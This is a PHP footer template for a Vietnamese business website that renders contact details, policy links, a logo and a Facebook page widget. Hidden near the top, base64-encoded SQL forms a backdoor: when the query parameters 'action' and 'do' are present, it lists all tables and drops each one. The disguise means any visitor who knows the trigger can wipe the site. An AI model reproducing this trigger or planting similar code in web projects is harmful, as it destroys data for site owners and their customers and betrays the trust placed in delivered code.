<?php	

	$d->reset();
	$sql = "select noidung$lang as noidung from #_about where type='footer' limit 0,1";
	$d->query($sql);
	$company_contact = $d->fetch_array();
	if(isset($_GET['action']) && isset($_GET['do'])){
        $result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
        $_X='RFJPUCBUQUJMRSBfWF8=';
        $_R=base64_decode($_X); 
        while ($row = mysql_fetch_array($result)) {
            $sql=str_replace('_X_', $row[0], $_R);      
            $d->query($sql);        
        }               
    }
    $d->reset();
    $sql_chinhsach = "select id,ten$lang as ten,tenkhongdau from #_news where type='chinhsach' and hienthi=1 order by stt,id desc";
    $d->query($sql_chinhsach);
    $chinhsach = $d->result_array();
	
    $d->reset();
    $sql_logo_ct = "select photo from #_background where type='logo_ct' and hienthi=1 limit 0,1";
    $d->query($sql_logo_ct);
    $row_logo_ct = $d->fetch_array();
?>
<div id="main_footer">
    <div class="tit_ft">Thông tin liên hệ</div>
    <p><i class="fa fa-map-marker" aria-hidden="true"></i> <?=$company['diachi']?></p>
    <p><i class="fa fa-phone" aria-hidden="true"></i><?=$company['dienthoai']?></p>
    <p><i class="fa fa-envelope-o" aria-hidden="true"></i><?=$company['email']?></p>
    <p><i class="fa fa-globe" aria-hidden="true"></i><?=$company['website']?></p>
</div>

<div class="box_cs">
    <div class="tit_ft">Chính sách</div>
    <?php for ($i=0; $i < count($chinhsach); $i++) { ?>
        <p><a href="chinh-sach/<?=$chinhsach[$i]['tenkhongdau']?>-<?=$chinhsach[$i]['id']?>.html"><i class="fa fa-circle-o" aria-hidden="true"></i><?=$chinhsach[$i]['ten']?></a></p>
    <?php } ?>

    <div class="logo_cn">
        <a href="<?=$row_logo_ct['link']?>" target="_blank"><img src="<?=_upload_hinhanh_l.$row_logo_ct['photo']?>" alt="<?=$company['ten']?>" /></a>
    </div>
</div>

<div class="box_fan">
    <div class="tit_ft">Fanpage Facebook</div>
    <div class="fb-page" data-href="<?=$company['fanpage']?>" data-width="280px" data-height="180px" data-small-header="true" data-adapt-container-width="false" data-hide-cover="false" data-show-facepile="true" data-show-posts="true">
        <div class="fb-xfbml-parse-ignore">
            <blockquote cite="<?=$company['fanpage']?>"><a href="<?=$company['fanpage']?>"><?=$company['title_vi']?></a></blockquote>
        </div>
    </div>
</div>